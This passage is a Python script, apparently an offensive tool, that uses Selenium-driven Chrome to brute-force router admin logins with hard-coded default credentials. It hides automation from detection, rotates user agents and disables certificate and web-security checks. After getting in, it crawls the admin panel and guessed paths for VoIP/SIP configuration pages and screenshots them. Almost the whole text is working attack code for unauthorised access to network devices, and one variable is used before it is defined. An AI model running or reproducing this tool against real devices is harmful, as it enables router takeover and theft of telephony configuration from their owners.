#!/usr/bin/env python3
"""
Router Brute Force Chrome - Chrome-based Router Login Brute Force Tool v2.0
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Chrome-based brute force attack with visible browser and screenshot capture
"""

import os
import sys
import time
import signal
import random
import argparse
import threading
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin
import warnings
warnings.filterwarnings('ignore')

# Try to import selenium libraries
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("Error: Selenium not available. Please install: pip install selenium")
    sys.exit(1)

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Global variables
running = True
stats = {'targets_scanned': 0, 'successful_logins': 0, 'screenshots_taken': 0, 'start_time': None}

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_ascii_banner(text):
    """Generate ASCII art banner from text"""
    ascii_patterns = {
        'A': ['  ██  ', ' ████ ', '██  ██', '██████', '██  ██', '██  ██'],
        'B': ['█████ ', '██  ██', '█████ ', '██  ██', '██  ██', '█████ '],
        'C': [' █████', '██    ', '██    ', '██    ', '██    ', ' █████'],
        'D': ['█████ ', '██  ██', '██  ██', '██  ██', '██  ██', '█████ '],
        'E': ['██████', '██    ', '█████ ', '██    ', '██    ', '██████'],
        'F': ['██████', '██    ', '█████ ', '██    ', '██    ', '██    '],
        'G': [' █████', '██    ', '██    ', '██ ███', '██  ██', ' █████'],
        'H': ['██  ██', '██  ██', '██████', '██  ██', '██  ██', '██  ██'],
        'I': ['██████', '  ██  ', '  ██  ', '  ██  ', '  ██  ', '██████'],
        'J': ['██████', '    ██', '    ██', '    ██', '██  ██', ' ████ '],
        'K': ['██  ██', '██ ██ ', '████  ', '██ ██ ', '██  ██', '██  ██'],
        'L': ['██    ', '██    ', '██    ', '██    ', '██    ', '██████'],
        'M': ['██  ██', '██████', '██ ████', '██  ██', '██  ██', '██  ██'],
        'N': ['██  ██', '███ ██', '██████', '██ ███', '██  ██', '██  ██'],
        'O': [' ████ ', '██  ██', '██  ██', '██  ██', '██  ██', ' ████ '],
        'P': ['█████ ', '██  ██', '██  ██', '█████ ', '██    ', '██    '],
        'Q': [' ████ ', '██  ██', '██  ██', '██ ███', '██  ██', ' █████'],
        'R': ['█████ ', '██  ██', '██  ██', '█████ ', '██ ██ ', '██  ██'],
        'S': [' █████', '██    ', '██    ', ' █████', '    ██', '█████ '],
        'T': ['██████', '  ██  ', '  ██  ', '  ██  ', '  ██  ', '  ██  '],
        'U': ['██  ██', '██  ██', '██  ██', '██  ██', '██  ██', ' ████ '],
        'V': ['██  ██', '██  ██', '██  ██', '██  ██', ' ████ ', '  ██  '],
        'W': ['██  ██', '██  ██', '██  ██', '██ ████', '██████', '██  ██'],
        'X': ['██  ██', '██  ██', ' ████ ', ' ████ ', '██  ██', '██  ██'],
        'Y': ['██  ██', '██  ██', ' ████ ', '  ██  ', '  ██  ', '  ██  '],
        'Z': ['██████', '    ██', '   ██ ', '  ██  ', ' ██   ', '██████'],
        ' ': ['      ', '      ', '      ', '      ', '      ', '      ']
    }
    
    text = text.upper()
    lines = [''] * 6
    
    for char in text:
        if char in ascii_patterns:
            pattern = ascii_patterns[char]
            for i in range(6):
                lines[i] += pattern[i] + ' '
        else:
            for i in range(6):
                lines[i] += '      '
    
    banner = f"""
{Colors.GREEN}{Colors.BOLD}"""
    for line in lines:
        banner += line.rstrip() + "\n"
    banner += f"{Colors.END}"
    
    return banner

def print_banner():
    # Matrix rain intro
    try:
        import shutil
        width = shutil.get_terminal_size((80, 24)).columns
    except Exception:
        width = 80
    charset = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*")
    end_time = time.time() + 2
    columns = [0] * width
    while time.time() < end_time:
        line_chars = []
        for i in range(width):
            if columns[i] <= 0 and random.random() < 0.02:
                columns[i] = random.randint(3, 10)
            if columns[i] > 0:
                line_chars.append(random.choice(charset))
                columns[i] -= 1
            else:
                line_chars.append(' ')
        print(f"{Colors.GREEN}" + ''.join(line_chars) + f"{Colors.END}")
        time.sleep(0.03)
    
    banner_text = "Router Chrome"
    banner = generate_ascii_banner(banner_text)
    print(banner)

# Target credentials - exactly as requested
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user")
]

# User-Agent rotation for anti-detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
]

class ChromeRouterBruteForce:
    def __init__(self, login_urls, timeout=10, headless=False, screenshot_dir="screenshots"):
        self.login_urls = login_urls if isinstance(login_urls, list) else [login_urls]
        self.timeout = timeout
        self.headless = headless
        self.screenshot_dir = screenshot_dir
        self.driver = None
        self.lock = threading.Lock()
        self.vulnerable_findings = []  # Store vulnerable findings
        
        # Create screenshot directory
        if not os.path.exists(self.screenshot_dir):
            os.makedirs(self.screenshot_dir)
    
    def setup_chrome_driver(self):
        """Setup Chrome driver with cross-platform support"""
        try:
            chrome_options = Options()
            
            # Basic options
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--disable-features=VizDisplayCompositor')
            chrome_options.add_argument('--disable-background-networking')
            chrome_options.add_argument('--disable-background-timer-throttling')
            chrome_options.add_argument('--disable-renderer-backgrounding')
            chrome_options.add_argument('--disable-backgrounding-occluded-windows')
            chrome_options.add_argument('--disable-ssl-error-handling')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--disable-features=TranslateUI')
            chrome_options.add_argument('--disable-ipc-flooding-protection')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # SSL and certificate handling
            chrome_options.add_experimental_option("prefs", {
                "profile.default_content_setting_values.notifications": 2,
                "profile.default_content_settings.popups": 0,
                "profile.managed_default_content_settings.images": 2
            })
            
            # Timeout and performance settings
            chrome_options.add_argument('--page-load-strategy=eager')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--memory-pressure-off')
            chrome_options.add_argument('--disable-hang-monitor')
            chrome_options.add_argument('--disable-prompt-on-repost')
            chrome_options.add_argument('--disable-domain-reliability')
            chrome_options.add_argument('--disable-component-extensions-with-background-pages')
            
            # Window size
            chrome_options.add_argument('--window-size=1920,1080')
            
            # User agent
            chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
            
            # Headless mode (if requested)
            if self.headless:
                chrome_options.add_argument('--headless')
            
            # Cross-platform Chrome driver setup
            if os.name == 'nt':  # Windows
                # Try to find ChromeDriver in common locations
                possible_paths = [
                    'chromedriver.exe',
                    'C:\\chromedriver\\chromedriver.exe',
                    'C:\\Program Files\\chromedriver\\chromedriver.exe',
                    'C:\\Program Files (x86)\\chromedriver\\chromedriver.exe'
                ]
            else:  # Linux/macOS
                possible_paths = [
                    'chromedriver',
                    '/usr/local/bin/chromedriver',
                    '/usr/bin/chromedriver',
                    '/opt/chromedriver/chromedriver'
                ]
            
            service = None
            for path in possible_paths:
                if os.path.exists(path):
                    service = Service(path)
                    break
            
            # Create driver
            if service:
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                # Let Selenium find chromedriver automatically
                self.driver = webdriver.Chrome(options=chrome_options)
            
            # Execute script to remove webdriver property
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print(f"{Colors.GREEN}[+] Chrome driver initialized successfully{Colors.END}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to initialize Chrome driver: {e}{Colors.END}")
            print(f"{Colors.YELLOW}[!] Please ensure ChromeDriver is installed and in PATH{Colors.END}")
            return False
    
    def detect_login_form(self):
        """Detect login form fields on the page"""
        try:
            # Common field name patterns (expanded)
            username_fields = [
                'username', 'user', 'login', 'admin', 'name', 'email', 'account',
                'userid', 'user_id', 'loginname', 'login_name', 'uname', 'account_name',
                'login_id', 'user_name', 'admin_user', 'auth_user', 'login_user'
            ]
            
            password_fields = [
                'password', 'pass', 'passwd', 'pwd', 'admin', 'secret', 'key',
                'user_password', 'login_password', 'admin_password', 'auth_password'
            ]
            
            username_field = None
            password_field = None
            
            print(f"{Colors.BLUE}[*] Searching for login form fields...{Colors.END}")
            
            # Try to find username field by name
            for field_name in username_fields:
                try:
                    element = self.driver.find_element(By.NAME, field_name)
                    if element.is_displayed() and element.is_enabled():
                        username_field = element
                        print(f"{Colors.GREEN}[+] Username field found by name: {field_name}{Colors.END}")
                        break
                except NoSuchElementException:
                    continue
            
            # Try to find username field by ID
            if not username_field:
                for field_name in username_fields:
                    try:
                        element = self.driver.find_element(By.ID, field_name)
                        if element.is_displayed() and element.is_enabled():
                            username_field = element
                            print(f"{Colors.GREEN}[+] Username field found by ID: {field_name}{Colors.END}")
                            break
                    except NoSuchElementException:
                        continue
            
            # Try to find password field by name
            for field_name in password_fields:
                try:
                    element = self.driver.find_element(By.NAME, field_name)
                    if element.is_displayed() and element.is_enabled():
                        password_field = element
                        print(f"{Colors.GREEN}[+] Password field found by name: {field_name}{Colors.END}")
                        break
                except NoSuchElementException:
                    continue
            
            # Try to find password field by ID
            if not password_field:
                for field_name in password_fields:
                    try:
                        element = self.driver.find_element(By.ID, field_name)
                        if element.is_displayed() and element.is_enabled():
                            password_field = element
                            print(f"{Colors.GREEN}[+] Password field found by ID: {field_name}{Colors.END}")
                            break
                    except NoSuchElementException:
                        continue
            
            # If not found by name/id, try by type
            if not username_field:
                try:
                    text_inputs = self.driver.find_elements(By.XPATH, "//input[@type='text']")
                    for input_elem in text_inputs:
                        if input_elem.is_displayed() and input_elem.is_enabled():
                            username_field = input_elem
                            print(f"{Colors.GREEN}[+] Username field found by type: text{Colors.END}")
                            break
                except NoSuchElementException:
                    pass
            
            if not password_field:
                try:
                    password_inputs = self.driver.find_elements(By.XPATH, "//input[@type='password']")
                    for input_elem in password_inputs:
                        if input_elem.is_displayed() and input_elem.is_enabled():
                            password_field = input_elem
                            print(f"{Colors.GREEN}[+] Password field found by type: password{Colors.END}")
                            break
                except NoSuchElementException:
                    pass
            
            # If still not found, try CSS selectors
            if not username_field or not password_field:
                try:
                    # Try CSS selectors for common patterns
                    css_selectors = [
                        "input[type='text']",
                        "input[type='email']", 
                        "input[name*='user']",
                        "input[name*='login']",
                        "input[id*='user']",
                        "input[id*='login']"
                    ]
                    
                    for selector in css_selectors:
                        try:
                            elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                            for element in elements:
                                if element.is_displayed() and element.is_enabled() and not username_field:
                                    username_field = element
                                    print(f"{Colors.GREEN}[+] Username field found by CSS: {selector}{Colors.END}")
                                    break
                            if username_field:
                                break
                        except:
                            continue
                    
                    # Try password CSS selectors
                    password_css_selectors = [
                        "input[type='password']",
                        "input[name*='pass']",
                        "input[id*='pass']"
                    ]
                    
                    for selector in password_css_selectors:
                        try:
                            elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                            for element in elements:
                                if element.is_displayed() and element.is_enabled() and not password_field:
                                    password_field = element
                                    print(f"{Colors.GREEN}[+] Password field found by CSS: {selector}{Colors.END}")
                                    break
                            if password_field:
                                break
                        except:
                            continue
                            
                except Exception as e:
                    print(f"{Colors.YELLOW}[!] CSS selector search failed: {e}{Colors.END}")
            
            return username_field, password_field
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error detecting login form: {e}{Colors.END}")
            return None, None
    
    def find_submit_button(self):
        """Find and return submit button"""
        try:
            # Common submit button selectors
            submit_selectors = [
                "//input[@type='submit']",
                "//button[@type='submit']",
                "//input[@value='Login']",
                "//button[contains(text(), 'Login')]",
                "//input[@value='Sign In']",
                "//button[contains(text(), 'Sign In')]",
                "//input[@value='Submit']",
                "//button[contains(text(), 'Submit')]",
                "//input[@value='Enter']",
                "//button[contains(text(), 'Enter')]",
                "//input[@value='OK']",
                "//button[contains(text(), 'OK')]",
                "//input[@value='Go']",
                "//button[contains(text(), 'Go')]"
            ]
            
            for selector in submit_selectors:
                try:
                    submit_button = self.driver.find_element(By.XPATH, selector)
                    return submit_button
                except NoSuchElementException:
                    continue
            
            # If no specific submit button found, try to find any button in a form
            try:
                submit_button = self.driver.find_element(By.XPATH, "//form//button")
                return submit_button
            except NoSuchElementException:
                pass
            
            # Last resort: try to find any input in a form
            try:
                submit_button = self.driver.find_element(By.XPATH, "//form//input")
                return submit_button
            except NoSuchElementException:
                pass
            
            return None
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error finding submit button: {e}{Colors.END}")
            return None
    
    def is_login_successful(self):
        """Check if login was successful by analyzing page content and URL"""
        try:
            current_url = self.driver.current_url.lower()
            page_source = self.driver.page_source.lower()
            
            # Check for admin panel indicators
            admin_indicators = [
                'admin', 'administrator', 'dashboard', 'control panel', 'configuration', 
                'settings', 'system', 'status', 'network', 'router', 'gateway', 'modem',
                'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos',
                'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart',
                'main menu', 'welcome', 'logout', 'log out', 'management', 'monitor',
                'device', 'interface', 'port', 'service', 'security', 'advanced'
            ]
            
            # Check for login page indicators (negative)
            login_indicators = [
                'username', 'password', 'login', 'sign in', 'authentication', 'enter credentials',
                'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed',
                'error', 'denied', 'wrong', 'access denied', 'please login', 'enter username'
            ]
            
            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
            login_count = sum(1 for indicator in login_indicators if indicator in page_source)
            
            # Check if URL changed from login page
            url_changed = not any(login_term in current_url for login_term in ['login', 'signin', 'sign-in', 'auth', 'authentication'])
            
            # Special case for phone systems - they might stay on same URL but change content
            if 'servlet' in current_url or 'phone' in page_title:
                url_changed = True  # Treat as URL changed for phone systems
                
                # For phone systems, be more strict about success detection
                if 'servlet' in current_url:
                    # Check for specific phone system success indicators
                    phone_success_indicators = [
                        'main menu', 'status', 'configuration', 'settings', 'network',
                        'system info', 'device info', 'admin', 'logout'
                    ]
                    phone_success_count = sum(1 for indicator in phone_success_indicators if indicator in page_source)
                    
                    if phone_success_count < 2:  # Need at least 2 success indicators
                        return False, f"Phone system - insufficient success indicators: {phone_success_count}"
            
            # Check for specific success indicators
            success_indicators = [
                'logout', 'log out', 'welcome', 'dashboard', 'main menu', 'system status',
                'device status', 'network status', 'router status', 'admin panel'
            ]
            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
            
            # Strong success criteria: URL changed AND has success indicators
            if url_changed and success_count >= 1:
                return True, f"URL changed and success indicators found: {success_count}"
            
            # Success criteria: more admin indicators than login indicators, and URL changed
            if admin_count > login_count and admin_count >= 2 and url_changed:
                return True, f"Admin indicators: {admin_count}, Login indicators: {login_count}"
            
            # Additional check: if we have substantial admin content
            if admin_count >= 3 and login_count <= 1:
                return True, f"Strong admin content detected: {admin_count} indicators"
            
            # Check for error pages first (but exclude 401 for HTTP Basic/Digest auth)
            error_indicators = [
                'not authorized', 'access denied', 'forbidden', 'unauthorized', 
                'you are not authorized', 'please contact your support', 'try again',
                'http 403', 'http 404', 'http 500'
            ]
            error_count = sum(1 for indicator in error_indicators if indicator in page_source)
            
            # Special handling for 401 - only flag as error if it's not part of HTTP Basic/Digest auth flow
            if 'http 401' in page_source:
                # Check if this is part of HTTP Basic/Digest auth flow
                if not ('www-authenticate' in page_source or 'basic' in page_source or 'digest' in page_source):
                    error_count += 1
            
            if error_count >= 1:
                return False, f"Error page detected: {error_count} error indicators"
            
            # More lenient criteria for form-based auth
            if admin_count >= 3 and login_count <= 2:
                return True, f"Form-based auth success: Admin: {admin_count}, Login: {login_count}"
            
            # Check for empty page title (might indicate successful login)
            page_title = self.driver.title.lower() if self.driver.title else ""
            if not page_title or page_title.strip() == "":
                # If page title is empty but we have admin content, it might be successful
                if admin_count >= 2 and login_count <= 2:
                    return True, f"Empty title but admin content: Admin: {admin_count}, Login: {login_count}"
            
            return False, f"Admin indicators: {admin_count}, Login indicators: {login_count}, Success indicators: {success_count}"
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error checking login success: {e}{Colors.END}")
            return False, f"Error: {e}"
    
    def take_screenshot(self, filename_prefix="login_attempt", url=None):
        """Take screenshot and save it"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            
            # Extract IP from URL if provided
            ip_part = ""
            if url:
                try:
                    from urllib.parse import urlparse
                    parsed_url = urlparse(url)
                    if parsed_url.hostname:
                        ip_part = f"_{parsed_url.hostname}"
                except:
                    pass
            
            filename = f"{filename_prefix}{ip_part}_{timestamp}.png"
            filepath = os.path.join(self.screenshot_dir, filename)
            
            self.driver.save_screenshot(filepath)
            print(f"{Colors.GREEN}[+] Screenshot saved: {filepath}{Colors.END}")
            return filepath
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to take screenshot: {e}{Colors.END}")
            return None
    
    def find_voip_sip_pages(self, base_url):
        """Find and navigate to VoIP/SIP configuration pages"""
        try:
            print(f"{Colors.CYAN}[*] Searching for VoIP/SIP configuration pages...{Colors.END}")
            
            screenshots_taken = []
            
            # Method 1: Extract all links from admin panel and filter VoIP/SIP ones
            print(f"{Colors.BLUE}[*] Extracting all links from admin panel...{Colors.END}")
            
            try:
                # Get all links on the current admin panel page - try multiple methods
                links = []
                
                # Method 1: Standard links
                try:
                    links.extend(self.driver.find_elements(By.TAG_NAME, "a"))
                except:
                    pass
                
                # Method 2: Clickable elements
                try:
                    clickable_elements = self.driver.find_elements(By.CSS_SELECTOR, "[onclick], [href], button, input[type='button'], input[type='submit']")
                    links.extend(clickable_elements)
                except:
                    pass
                
                # Method 3: All elements with href
                try:
                    href_elements = self.driver.find_elements(By.CSS_SELECTOR, "[href]")
                    links.extend(href_elements)
                except:
                    pass
                
                # Method 4: All clickable divs/spans (common in router interfaces)
                try:
                    clickable_divs = self.driver.find_elements(By.CSS_SELECTOR, "div[onclick], span[onclick], td[onclick], li[onclick]")
                    links.extend(clickable_divs)
                except:
                    pass
                
                # Remove duplicates
                unique_links = []
                seen_hrefs = set()
                for link in links:
                    try:
                        href = link.get_attribute("href") or link.get_attribute("onclick") or ""
                        if href and href not in seen_hrefs:
                            unique_links.append(link)
                            seen_hrefs.add(href)
                    except:
                        pass
                
                links = unique_links
                
                voip_links = []
                voip_keywords = [
                    "voip", "sip", "voice", "telephony", "phone", "pbx", "trunk",
                    "call", "dial", "extension", "line", "gateway", "proxy", "fax",
                    "phone system", "call routing", "sip server", "voip server"
                ]
                
                print(f"{Colors.BLUE}[*] Found {len(links)} total clickable elements on admin panel{Colors.END}")
                
                # Debug: Print some link examples
                for i, link in enumerate(links[:10]):  # Show first 10 links
                    try:
                        text = link.text.strip()
                        href = link.get_attribute("href") or link.get_attribute("onclick") or ""
                        print(f"{Colors.BLUE}[*] Link {i+1}: '{text[:50]}' -> {href[:100]}{Colors.END}")
                    except:
                        pass
                
                # Filter links that contain VoIP/SIP keywords
                for link in links:
                    try:
                        link_text = link.text.lower().strip()
                        link_href = link.get_attribute("href") or link.get_attribute("onclick") or ""
                        
                        # Check if link text contains VoIP/SIP keywords
                        if link_text and any(keyword in link_text for keyword in voip_keywords):
                            voip_links.append({
                                'text': link_text,
                                'href': link_href,
                                'element': link
                            })
                            print(f"{Colors.GREEN}[+] Found VoIP/SIP link: '{link_text}' -> {link_href}{Colors.END}")
                        
                        # Also check href/onclick for VoIP/SIP keywords
                        elif link_href and any(keyword in link_href.lower() for keyword in voip_keywords):
                            voip_links.append({
                                'text': f"Link: {link_href}",
                                'href': link_href,
                                'element': link
                            })
                            print(f"{Colors.GREEN}[+] Found VoIP/SIP link in URL: {link_href}{Colors.END}")
                        
                        # Check for common router navigation patterns
                        elif link_text and any(nav in link_text for nav in ["advanced", "network", "system", "config", "settings", "admin"]):
                            # Check if this might lead to VoIP pages
                            voip_links.append({
                                'text': link_text,
                                'href': link_href,
                                'element': link
                            })
                            print(f"{Colors.YELLOW}[*] Found potential navigation link: '{link_text}' -> {link_href}{Colors.END}")
                            
                    except Exception as e:
                        continue
                
                print(f"{Colors.BLUE}[*] Found {len(voip_links)} VoIP/SIP related links{Colors.END}")
                
                # Visit each VoIP/SIP link and check for configuration content
                for i, link_info in enumerate(voip_links):
                    try:
                        print(f"{Colors.BLUE}[*] Visiting VoIP/SIP link {i+1}/{len(voip_links)}: {link_info['text']}{Colors.END}")
                        
                        # Click the link
                        link_info['element'].click()
                        time.sleep(4)  # Wait for page to load
                        
                        # Check current URL and page content
                        current_url = self.driver.current_url
                        page_source = self.driver.page_source.lower()
                        title = self.driver.title.lower()
                        
                        # Enhanced VoIP/SIP indicators
                        voip_indicators = [
                            'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
                            'call', 'dial', 'extension', 'line', 'gateway', 'proxy', 'fax',
                            'sip server', 'voip server', 'phone system', 'call routing',
                            'sip proxy', 'sip registrar', 'sip trunk', 'voip gateway',
                            'call forwarding', 'call transfer', 'conference', 'hold',
                            'ringtone', 'voicemail', 'dial plan', 'codec', 'dtmf'
                        ]
                        
                        # Count VoIP indicators in page content
                        voip_count = sum(1 for indicator in voip_indicators if indicator in page_source)
                        title_voip_count = sum(1 for indicator in voip_indicators if indicator in title)
                        
                        total_voip_indicators = voip_count + title_voip_count
                        
                        print(f"{Colors.BLUE}[*] VoIP indicators found: {voip_count} in content, {title_voip_count} in title{Colors.END}")
                        
                        # Check if this is a VoIP/SIP configuration page
                        if total_voip_indicators >= 2:  # At least 2 VoIP indicators
                            print(f"{Colors.GREEN}[+] VoIP/SIP configuration page found!{Colors.END}")
                            print(f"{Colors.GREEN}[+] URL: {current_url}{Colors.END}")
                            print(f"{Colors.GREEN}[+] Title: {self.driver.title}{Colors.END}")
                            print(f"{Colors.GREEN}[+] VoIP indicators: {total_voip_indicators}{Colors.END}")
                            
                            # Take screenshot
                            screenshot_path = self.take_screenshot(f"voip_sip_config_link_{i+1}", current_url)
                            if screenshot_path:
                                screenshots_taken.append(screenshot_path)
                            
                            # Look for SIP configuration forms or tables
                            try:
                                # Check for common SIP configuration elements
                                sip_elements = [
                                    "input[name*='sip']", "input[name*='voip']", "input[name*='phone']",
                                    "select[name*='sip']", "select[name*='voip']", "select[name*='codec']",
                                    "textarea[name*='sip']", "table[id*='sip']", "table[class*='sip']",
                                    "form[id*='sip']", "form[name*='sip']", "form[class*='sip']"
                                ]
                                
                                for selector in sip_elements:
                                    elements = self.driver.find_elements(By.CSS_SELECTOR, selector)
                                    if elements:
                                        print(f"{Colors.GREEN}[+] Found SIP configuration element: {selector}{Colors.END}")
                                        break
                                        
                            except Exception as e:
                                pass
                            
                        else:
                            print(f"{Colors.YELLOW}[!] Not a VoIP/SIP configuration page (only {total_voip_indicators} indicators){Colors.END}")
                        
                        # Go back to admin panel
                        self.driver.back()
                        time.sleep(2)
                        
                    except Exception as e:
                        print(f"{Colors.YELLOW}[!] Error visiting VoIP link: {e}{Colors.END}")
                        # Try to go back if we're stuck
                        try:
                            self.driver.back()
                            time.sleep(2)
                        except:
                            pass
                        continue
                        
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Error extracting VoIP links: {e}{Colors.END}")
            
            # Method 2: Try common VoIP/SIP paths as fallback
            if not screenshots_taken:
                print(f"{Colors.BLUE}[*] Trying common VoIP/SIP paths as fallback...{Colors.END}")
                
                voip_paths = [
                    "/voip", "/sip", "/voice", "/telephony", "/phone", "/fax",
                    "/advanced/voip", "/advanced/sip", "/advanced/voice", "/advanced/telephony",
                    "/network/voip", "/network/sip", "/network/voice", "/network/telephony",
                    "/admin/voip", "/admin/sip", "/admin/voice", "/admin/telephony",
                    "/config/voip", "/config/sip", "/config/voice", "/config/telephony",
                    "/settings/voip", "/settings/sip", "/settings/voice", "/settings/telephony",
                    "/system/voip", "/system/sip", "/system/voice", "/system/telephony",
                    "/voip.html", "/sip.html", "/voice.html", "/telephony.html", "/phone.html",
                    "/advanced_voip.html", "/advanced_sip.html", "/voip_config.html", "/sip_config.html",
                    "/voip_configuration.html", "/sip_configuration.html", "/voice_config.html",
                    "/phone_config.html", "/telephony_config.html", "/pbx.html", "/trunk.html",
                    "/call_routing.html", "/extension.html", "/gateway.html", "/proxy.html",
                    "/call_forwarding.html", "/voicemail.html", "/conference.html", "/hold.html",
                    "/dial_plan.html", "/codec.html", "/dtmf.html", "/ringtone.html",
                    "/call_transfer.html", "/call_waiting.html", "/caller_id.html"
                ]
                
                for path in voip_paths:
                    try:
                        voip_url = f"{base_url.rstrip('/')}{path}"
                        print(f"{Colors.BLUE}[*] Trying VoIP path: {voip_url}{Colors.END}")
                        
                        self.driver.get(voip_url)
                        time.sleep(3)
                        
                        # Check if page loaded successfully and contains VoIP/SIP content
                        page_source = self.driver.page_source.lower()
                        title = self.driver.title.lower()
                        
                        voip_indicators = [
                            'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
                            'call', 'dial', 'extension', 'line', 'gateway', 'proxy'
                        ]
                        
                        voip_count = sum(1 for indicator in voip_indicators if indicator in page_source or indicator in title)
                        
                        if voip_count >= 2:  # At least 2 VoIP indicators
                            print(f"{Colors.GREEN}[+] VoIP/SIP page found: {voip_url}{Colors.END}")
                            print(f"{Colors.GREEN}[+] VoIP indicators: {voip_count}{Colors.END}")
                            
                            # Take screenshot
                            screenshot_path = self.take_screenshot(f"voip_sip_config_{path.replace('/', '_')}", voip_url)
                            if screenshot_path:
                                screenshots_taken.append(screenshot_path)
                            
                            # Don't try more paths if we found a good one
                            break
                            
                    except Exception as e:
                        continue
            
            # Method 3: Search current admin panel page for VoIP/SIP content
            if not screenshots_taken:
                print(f"{Colors.BLUE}[*] Searching current admin panel for VoIP/SIP content...{Colors.END}")
                
                try:
                    # Go back to admin panel
                    self.driver.get(base_url)
                    time.sleep(3)
                    
                    # Get page content
                    page_source = self.driver.page_source.lower()
                    title = self.driver.title.lower()
                    
                    # Enhanced VoIP/SIP indicators
                    voip_indicators = [
                        'voip', 'sip', 'voice', 'telephony', 'phone', 'pbx', 'trunk',
                        'call', 'dial', 'extension', 'line', 'gateway', 'proxy', 'fax',
                        'sip server', 'voip server', 'phone system', 'call routing',
                        'sip proxy', 'sip registrar', 'sip trunk', 'voip gateway',
                        'call forwarding', 'call transfer', 'conference', 'hold',
                        'ringtone', 'voicemail', 'dial plan', 'codec', 'dtmf',
                        'call waiting', 'caller id', 'call blocking', 'call log'
                    ]
                    
                    voip_count = sum(1 for indicator in voip_indicators if indicator in page_source)
                    title_voip_count = sum(1 for indicator in voip_indicators if indicator in title)
                    
                    total_voip_indicators = voip_count + title_voip_count
                    
                    print(f"{Colors.BLUE}[*] VoIP indicators in admin panel: {voip_count} in content, {title_voip_count} in title{Colors.END}")
                    
                    if total_voip_indicators >= 1:  # Even 1 indicator might be worth checking
                        print(f"{Colors.GREEN}[+] Found VoIP/SIP content in admin panel!{Colors.END}")
                        print(f"{Colors.GREEN}[+] Total VoIP indicators: {total_voip_indicators}{Colors.END}")
                        
                        # Take screenshot of admin panel with VoIP content
                        screenshot_path = self.take_screenshot("voip_sip_admin_panel", base_url)
                        if screenshot_path:
